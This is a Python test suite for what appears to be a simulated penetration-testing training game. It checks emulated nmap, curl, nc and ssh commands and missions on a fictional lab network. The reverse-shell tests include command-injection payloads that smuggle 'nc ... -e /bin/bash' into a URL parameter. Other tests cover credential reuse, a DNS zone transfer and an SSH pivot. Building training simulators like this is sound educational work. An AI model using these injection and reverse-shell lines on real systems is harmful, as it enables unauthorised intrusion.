import unittest

from omnisploit.engine.network import ShellChannel
from omnisploit.engine.world import World
from omnisploit.shell.shell import Shell


def run(sh, line):
    out = sh.run_line(line)
    o = b"".join(d for d, e in out.chunks if not e).decode(errors="replace")
    e = b"".join(d for d, e in out.chunks if e).decode(errors="replace")
    return o, e


class NetFixture(unittest.TestCase):
    def setUp(self):
        self.world = World()
        self.sh = Shell(self.world)

    def login_deploy(self):
        run(self.sh, "ssh deploy@intranet")
        run(self.sh, "yes")
        return run(self.sh, "Winter2026!")


class NmapTests(NetFixture):
    def test_host_discovery_and_default_ports(self):
        o, _ = run(self.sh, "nmap -sn 10.10.0.0/24")
        self.assertIn("Nmap scan report for intranet.brightside.lab (10.10.0.10)", o)
        self.assertIn("256 IP addresses (3 hosts up)", o)  # the db host drops pings
        self.assertNotIn("db.brightside", o)
        o, _ = run(self.sh, "nmap files")
        self.assertIn("21/tcp open  ftp", o)
        self.assertNotIn("9999", o)  # not in the default 1000 ports

    def test_all_ports_and_versions(self):
        o, _ = run(self.sh, "nmap -sV -p- 10.10.0.20")
        self.assertIn("9999/tcp open  abyss", o)
        self.assertIn("21/tcp   open  ftp     vsftpd 3.0.5", o)
        self.assertIn("Service detection performed", o)
        self.assertIn("net:nmap-allports", self.world.events)

    def test_aggressive_scripts(self):
        o, _ = run(self.sh, "nmap -A -p 80 intranet")
        self.assertIn("|_http-title: Brightside Intranet", o)
        self.assertIn("2 disallowed entries", o)
        self.assertIn("|_/backup/ /admin/", o)

    def test_firewalled_host_needs_pn(self):
        self.assertIn("Host seems down", run(self.sh, "nmap 10.10.0.30")[0])
        o, _ = run(self.sh, "nmap -Pn -p 3306 10.10.0.30")
        self.assertIn("3306/tcp filtered mysql", o)  # only the intranet host is allowed through

    def test_internal_subnet_is_invisible_from_here(self):
        self.assertIn("Host seems down", run(self.sh, "nmap 10.20.0.5")[0])

    def test_root_scans_are_refused_and_bad_input(self):
        self.assertIn("requires root privileges", run(self.sh, "nmap -sS 10.10.0.10")[1])
        self.assertIn("Failed to resolve", run(self.sh, "nmap nosuch.host")[1])
        self.assertIn("illegal", run(self.sh, "nmap -p 99999 intranet")[1])

    def test_output_file(self):
        run(self.sh, "nmap -p 22,80 -oN /tmp/scan.txt intranet")
        self.assertIn("22/tcp open  ssh", run(self.sh, "cat /tmp/scan.txt")[0])


class PingTraceDnsTests(NetFixture):
    def test_ping(self):
        o, _ = run(self.sh, "ping -c 3 intranet")
        self.assertIn("3 packets transmitted, 3 received, 0% packet loss", o)
        self.assertIn("ttl=64", o)
        o, _ = run(self.sh, "ping -c 2 10.10.0.30")
        self.assertIn("100% packet loss", o)
        self.assertIn("Name or service not known", run(self.sh, "ping nosuch.host")[1])
        self.assertIn("Network is unreachable", run(self.sh, "ping -c1 10.20.0.5")[1])
        self.assertIn("Destination Host Unreachable", run(self.sh, "ping -c1 10.10.0.99")[0])

    def test_traceroute(self):
        o, _ = run(self.sh, "traceroute intranet")
        self.assertIn("traceroute to intranet (10.10.0.10)", o)
        self.assertIn("intranet.brightside.lab (10.10.0.10)", o)
        self.assertIn("Network is unreachable", run(self.sh, "traceroute 10.20.0.5")[1])

    def test_dig_and_host(self):
        self.assertEqual(run(self.sh, "dig intranet.brightside.lab +short")[0], "10.10.0.10\n")
        self.assertEqual(run(self.sh, "dig brightside.lab MX +short")[0], "10 mail.brightside.lab.\n")
        self.assertEqual(run(self.sh, "dig -x 10.10.0.20 +short")[0], "files.brightside.lab.\n")
        o, _ = run(self.sh, "dig nosuch.brightside.lab")
        self.assertIn("status: NXDOMAIN", o)
        self.assertIn("files.brightside.lab has address 10.10.0.20", run(self.sh, "host files")[0])
        self.assertIn("descriptive text", run(self.sh, "host -t txt _notes.brightside.lab")[0])
        self.assertIn("domain name pointer intranet.brightside.lab.", run(self.sh, "host 10.10.0.10")[0])

    def test_zone_transfer_is_allowed_by_the_gateway_only(self):
        o, _ = run(self.sh, "dig axfr brightside.lab @10.10.0.1")
        self.assertIn("vault.brightside.lab.\t3600\tIN\tA\t10.20.0.5", o)
        self.assertIn("staging.brightside.lab.", o)
        self.assertIn("net:dns-axfr", self.world.events)
        self.assertIn("no servers could be reached", run(self.sh, "dig axfr brightside.lab @10.10.0.10")[0])


class CurlTests(NetFixture):
    def test_pages_headers_and_errors(self):
        self.assertIn("Brightside Intranet", run(self.sh, "curl -s http://10.10.0.10/")[0])
        o, _ = run(self.sh, "curl -I intranet/robots.txt")
        self.assertIn("HTTP/1.1 200 OK", o)
        self.assertIn("Server: nginx/1.18.0 (Ubuntu)", o)
        self.assertEqual(run(self.sh, "curl -s intranet/robots.txt")[0], "User-agent: *\nDisallow: /backup/\nDisallow: /admin/\n")
        self.assertIn("(7)", run(self.sh, "curl intranet:81")[1])
        self.assertIn("(6) Could not resolve host: nosuch.host", run(self.sh, "curl nosuch.host")[1])
        self.assertIn("(28)", run(self.sh, "curl http://10.10.0.30:3306/")[1])
        self.assertIn("(35)", run(self.sh, "curl https://intranet:80/")[1])
        self.assertIn("(22) The requested URL returned error: 404", run(self.sh, "curl -f intranet/nope")[1])

    def test_basic_auth_and_redirects(self):
        o, _ = run(self.sh, "curl -si intranet/admin/")
        self.assertIn("401 Unauthorized", o)
        self.assertIn('WWW-Authenticate: Basic realm="Brightside Admin"', o)
        self.assertIn("FLAG{curl_knows_the_way}", run(self.sh, "curl -s -u admin:s3cretadmin intranet/admin/")[0])
        self.assertNotIn("FLAG", run(self.sh, "curl -s -u admin:wrong intranet/admin/")[0])
        self.assertIn("301", run(self.sh, "curl -sI intranet/backup")[0])
        self.assertIn("deploy-notes.txt", run(self.sh, "curl -sL intranet/backup")[0])
        self.assertIn("Winter2026!", run(self.sh, "curl -s intranet/backup/deploy-notes.txt")[0])

    def test_login_flow_with_cookie_jar(self):
        o, _ = run(self.sh, "curl -s -c /tmp/jar -d 'user=staff&pass=Spring%232026' -i intranet/login")
        self.assertIn("302 Found", o)
        self.assertIn("session\tstaff-8f2a61", run(self.sh, "cat /tmp/jar")[0])
        self.assertIn("Staff portal", run(self.sh, "curl -s -b /tmp/jar intranet/portal")[0])
        self.assertNotIn("Staff portal", run(self.sh, "curl -sL intranet/portal")[0])
        self.assertEqual(run(self.sh, "curl -s -w '%{http_code}' -o /dev/null -d 'user=staff&pass=no' intranet/login")[0], "401")

    def test_verbose_and_output_file(self):
        o, e = run(self.sh, "curl -v intranet/api/status")
        self.assertIn("> GET /api/status HTTP/1.1", e)
        self.assertIn("< HTTP/1.1 200 OK", e)
        run(self.sh, "curl -s -o /tmp/s.json intranet/api/status")
        self.assertIn('"version": "2.4.1"', run(self.sh, "cat /tmp/s.json")[0])
        self.assertIn("Forbidden", run(self.sh, "curl -s intranet:8080/")[0])


class NcTests(NetFixture):
    def test_port_scan_and_banner_grab(self):
        o, e = run(self.sh, "nc -zv files 20-22")
        self.assertIn("Connection to files 21 port [tcp/ftp] succeeded!", e)
        self.assertIn("22 (tcp) failed: Connection refused", e)
        run(self.sh, "nc files 9999")
        self.assertEqual(self.sh.prompt(), "")
        self.assertIn("Commands: HELP VERSION STATUS QUIT", run(self.sh, "help")[0])
        self.assertIn("FLAG{nc_talks_tcp}", run(self.sh, "flag")[0])  # an undocumented command
        self.assertIn("bye", run(self.sh, "quit")[0])
        self.assertIsNone(self.sh.session)

    def test_ftp_conversation(self):
        o, _ = run(self.sh, "nc 10.10.0.20 21")
        run(self.sh, "USER anonymous")
        run(self.sh, "PASS x")
        self.assertIn("221 Goodbye.", run(self.sh, "QUIT")[0])

    def test_http_by_hand_and_piped(self):
        o, _ = run(self.sh, "printf 'GET /robots.txt HTTP/1.0\\r\\n\\r\\n' | nc intranet 80")
        self.assertIn("HTTP/1.0 200 OK", o)
        self.assertIn("Disallow: /backup/", o)
        run(self.sh, "nc intranet 80")
        run(self.sh, "GET /api/status HTTP/1.0")
        self.assertIn('"status": "ok"', run(self.sh, "")[0])

    def test_connection_failures(self):
        self.assertIn("Connection refused", run(self.sh, "nc intranet 81")[1])
        self.assertIn("timed out", run(self.sh, "nc 10.10.0.30 3306")[1])
        self.assertIn("No route to host", run(self.sh, "nc 10.20.0.5 22")[1])
        self.assertIn("Name or service not known", run(self.sh, "nc nosuch.host 80")[1])


class SshTests(NetFixture):
    def test_host_key_then_password(self):
        o, _ = run(self.sh, "ssh deploy@intranet")
        self.assertIn("The authenticity of host 'intranet (10.10.0.10)' can't be established.", o)
        self.assertTrue(self.sh.prompt().startswith("Are you sure"))
        o, e = run(self.sh, "yes")
        self.assertIn("Permanently added", e)
        self.assertEqual(self.sh.prompt(), "deploy@intranet's password: ")
        self.assertIn("Permission denied, please try again.", run(self.sh, "nope")[1])
        o, _ = run(self.sh, "Winter2026!")
        self.assertIn("Welcome to Ubuntu", o)
        self.assertEqual(self.sh.prompt(), "deploy@intranet:~$ ")
        self.assertEqual(run(self.sh, "hostname")[0], "intranet\n")
        self.assertIn("FLAG{ssh_is_a_door}", run(self.sh, "cat flag.txt")[0])
        self.assertIn("Connection to intranet closed.", run(self.sh, "exit")[0])
        self.assertEqual(self.sh.prompt(), "player@lab:~$ ")
        self.assertIn("ssh-ed25519", run(self.sh, "cat ~/.ssh/known_hosts")[0])
        self.assertIn("net:ssh:intranet.brightside.lab", self.world.events)

    def test_known_host_skips_the_question(self):
        self.login_deploy()
        run(self.sh, "exit")
        run(self.sh, "ssh deploy@intranet")
        self.assertEqual(self.sh.prompt(), "deploy@intranet's password: ")

    def test_three_failures_and_other_errors(self):
        run(self.sh, "ssh -o StrictHostKeyChecking=no deploy@intranet")
        run(self.sh, "a")
        run(self.sh, "b")
        o, e = run(self.sh, "c")
        self.assertIn("Permission denied (publickey,password).", e)
        self.assertIsNone(self.sh.session)
        self.assertIn("Connection refused", run(self.sh, "ssh -p 2222 deploy@intranet")[1])
        self.assertIn("Could not resolve hostname", run(self.sh, "ssh x@nosuch.host")[1])
        self.assertIn("Network is unreachable", run(self.sh, "ssh ops@10.20.0.5")[1])
        self.assertIn("Connection timed out", run(self.sh, "ssh x@10.10.0.30 -p 3306")[1])
        run(self.sh, "ssh deploy@intranet")
        run(self.sh, "no")
        self.assertIsNone(self.sh.session)

    def test_one_shot_command(self):
        run(self.sh, "ssh -o StrictHostKeyChecking=no deploy@intranet cat flag.txt")
        o, _ = run(self.sh, "Winter2026!")
        self.assertEqual(o, "FLAG{ssh_is_a_door}\n")
        self.assertIsNone(self.sh.session)

    def test_pivot_to_the_internal_host_with_a_key(self):
        self.login_deploy()
        # from here the internal subnet exists
        o, _ = run(self.sh, "nmap -sn 10.20.0.0/24")
        self.assertIn("vault.brightside.lab (10.20.0.5)", o)
        o, _ = run(self.sh, "nmap -p 22,5432 10.20.0.5")
        self.assertIn("22/tcp   open  ssh", o)
        self.assertIn("5432/tcp open  postgresql", o)  # reachable from the intranet box's internal interface
        self.assertIn("ttl=64", run(self.sh, "ping -c1 vault")[0])
        run(self.sh, "ssh -i ~/.ssh/vault_key -o StrictHostKeyChecking=no ops@10.20.0.5")
        self.assertEqual(self.sh.prompt(), "ops@vault:~$ ")
        self.assertIn("FLAG{pivot_complete}", run(self.sh, "cat flag.txt")[0])
        run(self.sh, "exit")
        self.assertEqual(self.sh.prompt(), "deploy@intranet:~$ ")
        run(self.sh, "exit")
        self.assertEqual(self.sh.prompt(), "player@lab:~$ ")
        self.assertIn("3306/tcp filtered mysql", run(self.sh, "nmap -Pn -p 3306 10.10.0.30")[0])  # only the intranet box may reach it

    def test_wrong_key_falls_back_to_password(self):
        run(self.sh, "echo junk > ~/k")
        self.login_deploy()
        run(self.sh, "echo junk > k")
        run(self.sh, "ssh -i k -o StrictHostKeyChecking=no ops@10.20.0.5")
        self.assertEqual(self.sh.prompt(), "ops@10.20.0.5's password: ")

    def test_events_from_a_remote_shell_count(self):
        self.login_deploy()
        run(self.sh, "curl -s localhost")  # nothing listens there, but the attempt is still a curl
        self.assertIn("net:curl", self.world.events)


class SsNetstatTests(NetFixture):
    def test_ss_lists_a_listener_and_its_owner(self):
        self.assertEqual(run(self.sh, "ss -tln")[0].splitlines(), ["State       Recv-Q Send-Q Local Address:Port    Peer Address:Port  "])
        run(self.sh, "nc -lvnp 4444 &")
        o, _ = run(self.sh, "ss -tlnp")
        self.assertIn("LISTEN", o)
        self.assertIn("0.0.0.0:4444", o)
        self.assertIn('users:(("nc",pid=', o)

    def test_ss_without_p_omits_the_process_column(self):
        run(self.sh, "nc -lvnp 5555 &")
        o, _ = run(self.sh, "ss -tln")
        self.assertIn("0.0.0.0:5555", o)
        self.assertNotIn("users:((", o)

    def test_netstat_matches_the_same_listener(self):
        run(self.sh, "nc -lvnp 4444 &")
        o, _ = run(self.sh, "netstat -tlnp")
        self.assertIn("0.0.0.0:4444", o)
        self.assertIn("LISTEN", o)
        self.assertRegex(o, r"\d+/nc")

    def test_closed_listeners_do_not_linger(self):
        run(self.sh, "nc -lvnp 4444 &")
        run(self.sh, "kill %1")
        self.assertNotIn("4444", run(self.sh, "ss -tln")[0])

    def test_only_this_machines_own_listeners_show(self):
        run(self.sh, "ssh -o StrictHostKeyChecking=no deploy@intranet")
        run(self.sh, "Winter2026!")
        self.assertEqual(run(self.sh, "ss -tln")[0].splitlines(), ["State       Recv-Q Send-Q Local Address:Port    Peer Address:Port  "])


class JobControlTests(NetFixture):
    def test_listener_lifecycle(self):
        o, e = run(self.sh, "nc -lvnp 4444 &")
        self.assertIn("Listening on 0.0.0.0 4444", e)
        self.assertIn("Running", run(self.sh, "jobs")[0])
        self.assertIn("Running", run(self.sh, "jobs")[0])  # still there on the next call
        self.assertIn("nothing has connected yet", run(self.sh, "fg")[1])
        self.assertIn("Address already in use", run(self.sh, "nc -l -p 4444 &")[1])
        self.assertIn("Exit 1", run(self.sh, "jobs")[0])
        o, _ = run(self.sh, "kill %1")
        self.assertIn("Terminated", o)
        self.assertEqual(run(self.sh, "jobs")[0], "")
        self.assertIn("no such job", run(self.sh, "fg")[1])

    def test_connect_back_gives_a_notice_then_a_shell(self):
        run(self.sh, "nc -lvnp 4444 &")
        ok = self.world.net.deliver("10.10.0.10", self.world.vantage, 4444, ShellChannel("intranet.brightside.lab", "deploy"))
        self.assertTrue(ok)
        o, _ = run(self.sh, "echo hi")
        self.assertIn("hi\n", o)
        self.assertIn("nc: connection received on port 4444 from 10.10.0.10", o)
        o, _ = run(self.sh, "fg %1")
        self.assertIn("Connection received on 10.10.0.10", o)
        self.assertEqual(self.sh.prompt(), "deploy@intranet:~$ ")
        self.assertEqual(run(self.sh, "whoami")[0], "deploy\n")
        run(self.sh, "exit")
        self.assertEqual(self.sh.prompt(), "player@lab:~$ ")
        self.assertEqual(run(self.sh, "jobs")[0], "")  # the listener went with the connection

    def test_nothing_connects_without_a_listener(self):
        self.assertFalse(self.world.net.deliver("10.10.0.10", self.world.vantage, 4444, ShellChannel("intranet.brightside.lab", "deploy")))

    def test_privileged_port_and_foreground_hint(self):
        self.assertIn("Permission denied", run(self.sh, "nc -l -p 80 &")[1])
        o, e = run(self.sh, "nc -l 4444")
        self.assertIn("in the background", e)

    def test_ordinary_background_jobs_still_finish_at_once(self):
        run(self.sh, "echo hi &")
        o, _ = run(self.sh, "jobs")
        self.assertIn("Done", o)
        self.assertEqual(run(self.sh, "jobs")[0], "")


class WorldTests(NetFixture):
    def test_name_resolution_files(self):
        self.assertIn("nameserver 10.10.0.1", run(self.sh, "cat /etc/resolv.conf")[0])
        self.assertIn("Permission denied", run(self.sh, "echo '10.10.0.10 myweb' >> /etc/hosts")[1])  # not root
        self.sh.vfs.install("/etc/hosts", "127.0.0.1 localhost\n10.10.0.10 myweb\n")
        self.assertIn("Brightside Intranet", run(self.sh, "curl -s myweb")[0])

    def test_every_new_command_has_a_man_page(self):
        for c in ("nmap", "curl", "nc", "ping", "traceroute", "dig", "host", "ssh", "jobs", "fg"):
            self.assertIn("NAME", run(self.sh, f"man {c}")[0], c)


class TlsUdpScpTests(NetFixture):
    def test_https_needs_k_for_the_self_signed_certificate(self):
        o, e = run(self.sh, "curl https://intranet/")
        self.assertIn("(60) SSL certificate problem: self-signed certificate", e)
        self.assertEqual(run(self.sh, "curl -s https://intranet/"), ("", ""))  # -s hides the error, like real curl
        self.assertIn("Brightside Intranet", run(self.sh, "curl -sk https://intranet/")[0])
        o, e = run(self.sh, "curl -vk https://intranet/")
        self.assertIn("* SSL certificate verify result: self-signed certificate (18), continuing anyway.", e.replace("*  SSL", "* SSL"))
        self.assertIn("subject: CN=intranet.brightside.lab", e)

    def test_plain_http_to_the_tls_port(self):
        o, _ = run(self.sh, "curl -s http://intranet:443/")
        self.assertIn("The plain HTTP request was sent to HTTPS port", o)
        o, _ = run(self.sh, "printf 'GET / HTTP/1.0\\r\\n\\r\\n' | nc intranet 443")
        self.assertIn("400 Bad Request", o)

    def test_certificate_names_reveal_a_virtual_host(self):
        o, _ = run(self.sh, "nmap -A -p 443 intranet")
        self.assertIn("443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)", o)
        self.assertIn("DNS:hr.brightside.lab", o)
        self.assertNotIn("HR portal", run(self.sh, "curl -sk https://intranet/")[0])
        self.assertIn("FLAG{virtual_hosts_hide_things}", run(self.sh, "curl -sk -H 'Host: hr.brightside.lab' https://intranet/")[0])
        self.assertIn("FLAG{virtual_hosts_hide_things}", run(self.sh, "curl -sk --resolve hr.brightside.lab:443:10.10.0.10 https://hr.brightside.lab/")[0])

    def test_udp(self):
        o, e = run(self.sh, "nc -zuv files 5-9")
        self.assertIn("Connection to files 7 port [udp/echo] succeeded!", e)
        self.assertIn("port 8 (udp) failed: Connection refused", e)
        self.assertIn("UDP listeners are not simulated", run(self.sh, "nc -ul -p 53")[1])
        run(self.sh, "nc -u files 7")
        self.assertEqual(run(self.sh, "hello")[0], "hello\n")  # the echo service answers every datagram
        self.sh.abort_input()  # Ctrl-C
        self.assertIsNone(self.sh.session)
        self.assertIn("requires root privileges", run(self.sh, "nmap -sU files")[1])

    def test_scp_both_ways(self):
        run(self.sh, "scp -o StrictHostKeyChecking=no deploy@intranet:flag.txt /tmp/")
        o, _ = run(self.sh, "Winter2026!")
        self.assertIn("flag.txt", o)
        self.assertIn("100%", o)
        self.assertEqual(run(self.sh, "cat /tmp/flag.txt")[0], "FLAG{ssh_is_a_door}\n")
        run(self.sh, "echo hi > up.txt")
        run(self.sh, "scp -o StrictHostKeyChecking=no up.txt deploy@intranet:")
        self.assertIn("up.txt", run(self.sh, "Winter2026!")[0])
        run(self.sh, "ssh -o StrictHostKeyChecking=no deploy@intranet cat up.txt")
        self.assertEqual(run(self.sh, "Winter2026!")[0], "hi\n")

    def test_scp_errors(self):
        self.assertIn("exactly one of source and target", run(self.sh, "scp a b")[1])
        run(self.sh, "scp -o StrictHostKeyChecking=no deploy@intranet:nosuch.txt .")
        o, e = run(self.sh, "Winter2026!")
        self.assertIn("No such file", e)
        self.assertIn("Network is unreachable", run(self.sh, "scp x ops@10.20.0.5:y")[1])


class RemoteStateTests(unittest.TestCase):
    def test_files_left_on_a_remote_machine_survive_a_save(self):
        import pathlib
        import tempfile

        from omnisploit.engine import save as savegame

        w = World()
        sh = Shell(w)
        pristine = savegame.snapshot(w)
        run(sh, "ssh -o StrictHostKeyChecking=no deploy@intranet")
        run(sh, "Winter2026!")
        run(sh, "echo left-behind > loot.txt")
        run(sh, "exit")
        path = pathlib.Path(tempfile.mkdtemp()) / "save.json"
        self.assertTrue(savegame.save_game(w, sh, pristine, path))
        w2 = World()
        sh2 = Shell(w2)
        self.assertTrue(savegame.load_game(w2, sh2, path))
        run(sh2, "ssh -o StrictHostKeyChecking=no deploy@intranet")
        run(sh2, "Winter2026!")
        self.assertEqual(run(sh2, "cat loot.txt")[0], "left-behind\n")
        self.assertIn("FLAG{ssh_is_a_door}", run(sh2, "cat flag.txt")[0])  # the original files are still there


class SecretInputTests(NetFixture):
    def test_password_prompt_is_marked_secret(self):
        run(self.sh, "ssh -o StrictHostKeyChecking=no deploy@intranet")
        self.assertTrue(self.sh.secret_input())
        run(self.sh, "Winter2026!")
        self.assertFalse(self.sh.secret_input())
        run(self.sh, "exit")
        run(self.sh, "ssh deploy@intranet")  # unknown host: the question is not secret
        self.assertFalse(self.sh.secret_input())

    def test_ctrl_c_abandons_a_login(self):
        run(self.sh, "ssh -o StrictHostKeyChecking=no deploy@intranet")
        self.sh.abort_input()
        self.assertIsNone(self.sh.session)

    def test_terminal_does_not_show_or_remember_a_secret(self):
        from omnisploit.ui.terminal import Terminal

        term = Terminal(lambda s: (0, []))
        term.history = []
        for ch in "hunter2":
            term.key(ch, "pw: ", secret=True)
        rows, crow, ccol = term.layout("pw: ", 40, 5, secret=True)
        self.assertNotIn("hunter2", "".join(c for _, _, c in rows))
        self.assertEqual(ccol, len("pw: "))
        self.assertEqual(term.key("<CR>", "pw: ", secret=True), "hunter2")
        self.assertEqual(term.history, [])
        self.assertNotIn("hunter2", "\n".join(ln.text for ln in term.lines))
        term.key("<Up>", "pw: ", secret=True)  # history keys do nothing
        self.assertEqual(term.buf, "")


class NetworkMissionTests(NetFixture):
    def setUp(self):
        super().setUp()
        run(self.sh, "mkdir ~/workspace")

    def completed(self):
        self.world.missions.evaluate()
        return list(self.world.missions.completed)

    def test_recon_mission(self):
        run(self.sh, "nmap -sn 10.10.0.0/24 | grep report")
        run(self.sh, "echo '10.10.0.1 10.10.0.10 10.10.0.20' > ~/workspace/hosts.txt")
        run(self.sh, "nmap -Pn -p 3306 10.10.0.30")
        run(self.sh, "echo 10.10.0.30 > ~/workspace/quiet-host.txt")
        run(self.sh, "nmap -p- 10.10.0.20")
        run(self.sh, "echo 9999 > ~/workspace/hidden-port.txt")
        run(self.sh, "dig axfr brightside.lab @10.10.0.1")
        self.assertNotIn("recon", self.completed())  # the service still has to be talked to
        run(self.sh, "printf 'FLAG\\n' | nc files 9999 | tail -1 > ~/workspace/ctl.txt")
        self.assertEqual([m for m in self.completed() if m == "recon"], ["recon"])

    def test_recon_rejects_wrong_findings(self):
        run(self.sh, "echo '10.10.0.1 10.10.0.10 10.10.0.20 10.10.0.99' > ~/workspace/hosts.txt")  # a host that does not exist
        run(self.sh, "echo 10.10.0.20 > ~/workspace/quiet-host.txt")
        todo, _ = run(self.sh, "cat ~/todo")
        self.completed()
        todo, _ = run(self.sh, "cat ~/todo")
        self.assertNotIn("[x] hosts.txt lists the machines", todo)
        self.assertNotIn("[x] quiet-host.txt", todo)

    def test_webenum_mission(self):
        run(self.sh, "curl -s intranet/robots.txt | grep Disallow | cut -d' ' -f2 > ~/workspace/disallowed.txt")
        run(self.sh, "curl -s intranet/backup/deploy-notes.txt | grep password | awk '{print $3}' > ~/workspace/deploy-password.txt")
        run(self.sh, "curl -s -u admin:s3cretadmin intranet/admin/ | grep -o 'FLAG{[a-z_]*}' > ~/workspace/admin-flag.txt")
        run(self.sh, "curl -s -c /tmp/j -d 'user=staff&pass=Spring%232026' intranet/login")
        run(self.sh, "curl -s -b /tmp/j intranet/portal | grep -o 'Ticket [0-9]*' | cut -d' ' -f2 > ~/workspace/ticket.txt")
        self.assertNotIn("webenum", self.completed())
        run(self.sh, "curl -sk -H 'Host: hr.brightside.lab' https://intranet/ | grep -o 'FLAG{[a-z_]*}' > ~/workspace/vhost-flag.txt")
        self.assertIn("webenum", self.completed())

    def test_the_password_in_the_backup_notes_is_the_ssh_password(self):
        run(self.sh, "curl -s intranet/backup/deploy-notes.txt")
        run(self.sh, "ssh -o StrictHostKeyChecking=no deploy@intranet")
        run(self.sh, "Winter2026!")
        self.assertEqual(self.sh.prompt(), "deploy@intranet:~$ ")


class ReverseShellTests(NetFixture):
    def test_full_attack_chain(self):
        run(self.sh, "nc -lvnp 4444 &")
        o, _ = run(self.sh, "curl -s 'http://intranet:8080/ping?host=127.0.0.1;nc 10.10.0.2 4444 -e /bin/bash'")
        self.assertIn("nc: connection received on port 4444 from 10.10.0.10", o)
        o, _ = run(self.sh, "fg %1")
        self.assertIn("Connection received on 10.10.0.10", o)
        self.assertEqual(self.sh.prompt(), "www-data@intranet:~$ ")
        self.assertEqual(run(self.sh, "whoami")[0], "www-data\n")
        self.assertEqual(run(self.sh, "cat /var/www/.secret.txt")[0], "FLAG{reverse_shells_work}\n")
        run(self.sh, "exit")
        self.assertEqual(self.sh.prompt(), "player@lab:~$ ")
        self.assertIn("net:revshell:intranet.brightside.lab", self.world.events)
        self.assertIn("net:nc-listen", self.world.events)

    def test_plain_ping_value_does_not_trigger_anything(self):
        run(self.sh, "nc -lvnp 4444 &")
        run(self.sh, "curl -s 'http://intranet:8080/ping?host=127.0.0.1'")
        self.assertEqual(run(self.sh, "jobs")[0], "[1]+  Running                 nc -lvnp 4444 &\n")
        self.assertIn("nothing has connected yet", run(self.sh, "fg")[1])

    def test_injection_without_a_recognizable_payload_is_harmless(self):
        run(self.sh, "nc -lvnp 4444 &")
        run(self.sh, "curl -s 'http://intranet:8080/ping?host=127.0.0.1;echo hi'")
        self.assertIn("nothing has connected yet", run(self.sh, "fg")[1])

    def test_deploy_account_cannot_read_the_www_data_secret(self):
        run(self.sh, "ssh -o StrictHostKeyChecking=no deploy@intranet")
        run(self.sh, "Winter2026!")
        self.assertIn("Permission denied", run(self.sh, "cat /var/www/.secret.txt")[1])
        run(self.sh, "exit")

    def test_other_argument_order_for_nc_also_works(self):
        run(self.sh, "nc -lvnp 4444 &")
        run(self.sh, "curl -s 'http://intranet:8080/ping?host=127.0.0.1;nc -e /bin/sh 10.10.0.2 4444'")
        run(self.sh, "fg %1")
        self.assertEqual(self.sh.prompt(), "www-data@intranet:~$ ")


class IpAddrTests(NetFixture):
    def test_hostname_ip_matches_vantage(self):
        self.assertEqual(run(self.sh, "hostname -I")[0], "10.10.0.2\n")
        self.assertIn("10.10.0.2/24", run(self.sh, "ip addr")[0])
        self.assertIn("inet 10.10.0.2  netmask 255.255.255.0", run(self.sh, "ifconfig")[0])

    def test_vantage_changes_after_ssh(self):
        run(self.sh, "ssh -o StrictHostKeyChecking=no deploy@intranet")
        run(self.sh, "Winter2026!")
        self.assertEqual(run(self.sh, "hostname -I")[0], "10.10.0.10\n")
        run(self.sh, "exit")
        self.assertEqual(run(self.sh, "hostname -I")[0], "10.10.0.2\n")


class RemoteFileOwnershipTests(NetFixture):
    def test_tuple_file_spec_sets_owner_and_mode(self):
        host = self.world.net.host_by_name("intranet.brightside.lab")
        remote = self.world.remote(host, "www-data")
        node = remote.world.vfs.get("/var/www/.secret.txt")
        self.assertEqual(node.owner, "www-data")
        self.assertEqual(node.mode, 0o600)


class BreachMissionTests(NetFixture):
    def setUp(self):
        super().setUp()
        run(self.sh, "mkdir ~/workspace")

    def completed(self):
        self.world.missions.evaluate()
        return list(self.world.missions.completed)

    def get_revshell(self):
        run(self.sh, "nc -lvnp 4444 &")
        run(self.sh, "curl -s 'http://intranet:8080/ping?host=127.0.0.1;nc 10.10.0.2 4444 -e /bin/bash'")
        run(self.sh, "fg %1")
        run(self.sh, "exit")

    def ssh_deploy(self):
        run(self.sh, "ssh -o StrictHostKeyChecking=no deploy@intranet")
        run(self.sh, "Winter2026!")

    def pivot_to_vault(self):
        run(self.sh, "ssh -i ~/.ssh/vault_key -o StrictHostKeyChecking=no ops@10.20.0.5")

    def test_requires_all_three_steps_plus_the_flag(self):
        self.assertEqual(self.completed(), [])
        self.get_revshell()
        self.assertEqual(self.completed(), [])
        self.ssh_deploy()
        self.assertEqual(self.completed(), [])
        self.pivot_to_vault()
        run(self.sh, "exit")
        run(self.sh, "exit")
        self.assertEqual(self.completed(), [])  # the flag still has to be saved
        run(self.sh, "echo FLAG{pivot_complete} > ~/workspace/breach-flag.txt")
        self.assertEqual(self.completed(), ["breach"])

    def test_the_pivot_itself_reads_the_real_flag(self):
        self.ssh_deploy()
        self.pivot_to_vault()
        self.assertEqual(run(self.sh, "cat flag.txt")[0], "FLAG{pivot_complete}\n")
        self.assertEqual(self.sh.prompt(), "ops@vault:~$ ")

    def test_ssh_to_vault_without_first_reaching_intranet_is_unreachable(self):
        self.assertIn("Network is unreachable", run(self.sh, "ssh ops@10.20.0.5")[1])

    def test_skipping_the_revshell_step_is_not_enough(self):
        self.ssh_deploy()
        self.pivot_to_vault()
        run(self.sh, "exit")
        run(self.sh, "exit")
        run(self.sh, "echo FLAG{pivot_complete} > ~/workspace/breach-flag.txt")
        self.assertEqual(self.completed(), [])

    def test_wrong_flag_text_does_not_complete_it(self):
        self.get_revshell()
        self.ssh_deploy()
        self.pivot_to_vault()
        run(self.sh, "exit")
        run(self.sh, "exit")
        run(self.sh, "echo FLAG{wrong} > ~/workspace/breach-flag.txt")
        self.assertEqual(self.completed(), [])
